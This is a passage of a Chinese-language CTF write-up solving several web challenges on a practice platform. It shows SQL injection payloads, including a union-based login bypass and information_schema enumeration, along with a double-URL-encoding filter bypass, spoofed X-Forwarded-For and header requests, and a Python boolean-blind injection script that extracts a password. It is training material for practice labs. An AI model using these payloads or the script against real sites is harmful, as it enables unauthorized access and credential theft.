$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];

  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
    echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
```
分析之后，其实就是一个登录的过程，只不过没有做关于sql的过滤，所以可以自己构建一个密码，来完成登录验证。
可以直接用union来构建一条记录即可，最终的payload
`user=' union select 'e10adc3949ba59abbe56e057f20f883e'#&pass=123456`

<br>

### what a fuck!这是什么鬼东西?
是jsfuck的内容，直接复制内容仍到浏览器F12的Console里面运行。运行后一个弹窗中有密码，得到flag。

<br>

### PHP大法
提醒的index.php.txt中有源码
```php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
```
这，直接传入`经过两次URL编码的hackerDJ`即可，因为第一次验证的适合，服务器会自动URL解码一次，但是还是URL的内容自然不通过
但是代码又把他URL解码了一次，那么就变回了`hackDJ`，所以匹配
最后的payload是`?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`

<br>

### 这个看起来有点简单!
这个。。我直接按照直觉判断，因为想想分数那么低，可能没做什么过滤，所以整个过程很顺利，就用了那么几条语句
```
?id=1
?id=2
?id=2-1
?id=1||1
?id=1||1 union select 1,2
?id=1||1 union select 1,table_name from information_schema.tables where table_schema=database() # thiskey
?id=1||1 union select 1,column_name from information_schema.columns where table_name='thiskey' #	k0y
?id=1||1 union select 1,k0y from thiskey
```


<br>

### 貌似有点难
```php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	$cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	$cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
	$cip = $_SERVER["REMOTE_ADDR"];
else
	$cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
```
一段获取你IP的代码，然后在根据IP做判断。所以只需要改变代码获取的IP即可
```http
GET /phpaudit/ HTTP/1.1
Host: ctf5.shiyanbar.com
X-Forwarded-For: 1.1.1.1
Connection: close
Upgrade-Insecure-Requests: 1
```



<br>

### 头有点大
提示说了三个要求，必须.NET9.9 IE浏览器 地区在英国
user-agent记录了使用了什么浏览器和.NET的版本号，所以找一个IE的user-agent，在自己修改即可。
地区在英文需要该`Accept-Language`，这边有一个巨坑无比的地方，`en-gb`需要全部小写，因为我找地区对应的字典里面是大写的，很坑很坑
```http
GET /sHeader/ HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 9.9; .NET CLR 9.9; Media Center PC 6.0; .NET9.9C; .NET9.9E; LBBROWSER) Trident/5.0;
Accept-Language: en-gb;q=1
Connection: close
Upgrade-Insecure-Requests: 1
```
<br>

### 猫抓老鼠
进入页面，右键源代码，没什么够的信息，那么直接去看响应头，看看有没有足够的信息
然后就能看见`Content-Row: MTUyMzA4NDQxOA==`，那么就找到了关键。
然后这边有一个我被绕进去的思维方式，我是解密后来提交参数，万万没有考虑到不解密作为key的想法。
后来在尝试找源码无果后，才在试一遍。得到flag
<br>

### 看起来有点难
进入页面就是一个登录界面,看响应报文和扫目录也没有什么信息
随便试了一下，发现页面中会显示出你输入的语句，很明显的SQL注入，回显来帮助你判断过滤规则
那么就开始注入
然后使劲的尝试中，发现了几个问题，里面的判断规则大致如下
1. 查询的用户存在的情况下回显`你的帐号密码有错误`
2. 帐号不存在的情况下回显`数据库连接失败！`
3. 如果SQL语句出错，不会回显任何提示


在后面尝试的过程中，发现select会被替换成空,后来利用大小写来绕过，但还是会弹出来一个不要进行SQL注入的提示
同时还发现了帐号为admin的用户存在

那么就可以根据现在的内容来进行布尔盲注
因为`admin' and 1=1 %23`的情况下显示帐号密码错误
而`admin' and 1=2 %23`的情况下现实数据库连接失败！

最后构建脚本跑出密码
```python
# coding=utf-8
import re
import requests

url = 'http://ctf5.shiyanbar.com/basic/inject/index.php'
result = ''

for i in range(1, 100):
    high = 126
    low = 32
    mid = (high + low) >> 1
    while high != mid:
        # payload = "admin=admin' and (Select ascii(mid(group_concat(table_name),{0},1)) from information_schema.tables where table_schema=database())>{1}    %23"
        # payload = "admin=admin' and (Select ascii(mid(group_concat(column_name),{0},1)) from information_schema.columns where table_name='admin')>{1}    %23"
        payload = "admin=admin' and (Select ascii(mid(group_concat(password),{0},1)) from admin)>{1}    %23"
        # idnuenna
        # payload = "admin=admin' and (Select ascii(mid(database(),{0},1)))>{1}    %23"
        payload = payload.format(i, mid)
        payload += "&pass=1&action=login"
        # print(payload)
        res = requests.get(url, params=payload)
        res.encoding = 'gb2312'
        data = res.text
        # print(data)
        data = re.findall(r'登录失败', data)
        # print(data)
        if data:
            # success
            low = mid + 1
        else:
            # fail
            high = mid
        mid = (high + low) >> 1
    result += chr(mid)
    print(result)
```

但是这边我还有一个疑问点，就是表中只存在一个用户，但是我账户利用SQL注入来绕过
密码是正确的，但无法成功?
`?admin=123' or '1&pass=idnuenna&action=login`


<br>
